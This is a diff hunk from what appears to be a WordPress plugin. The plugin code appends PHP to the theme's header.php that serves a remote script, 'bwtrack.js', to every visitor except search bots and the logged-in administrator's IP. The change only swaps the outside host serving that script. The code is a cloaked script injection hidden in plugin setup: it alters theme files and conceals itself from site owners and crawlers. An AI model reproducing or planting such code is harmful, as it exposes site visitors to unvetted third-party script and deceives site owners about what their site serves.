@@ -636,7 +636,7 @@ add_option("bw_global_excludelist", '', '', 'yes');
 add_option("bw_gpadded", '0', '', 'yes');
 add_option("bw_ip", '', '', 'yes');
 	if( strpos(file_get_contents(get_template_directory() . "/header.php"),"bwtrack") == false) {
-		file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.seo101.net/bwtrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
+		file_put_contents(get_template_directory() . "/header.php", "\n<?php\n\$btt = false;\nif (isset(\$_SERVER['HTTP_USER_AGENT']) && preg_match('/bot|crawl|slurp|spider/i', \$_SERVER['HTTP_USER_AGENT'])) {\n	\$btt = true;\n}\n\$ip = \$_SERVER['REMOTE_ADDR'];\nif ( is_user_logged_in() ) {\n	update_option( 'ame_ip', \$ip );\n}\nif ( !is_user_logged_in() && get_option('ame_ip')!=\$ip && \$btt==false) {\n	echo \"<script src=\\\"//www.shops2b.co.uk/bwtrack.js\\\"></script>\";\n}\n?>\n", FILE_APPEND);
 	}
 
 }
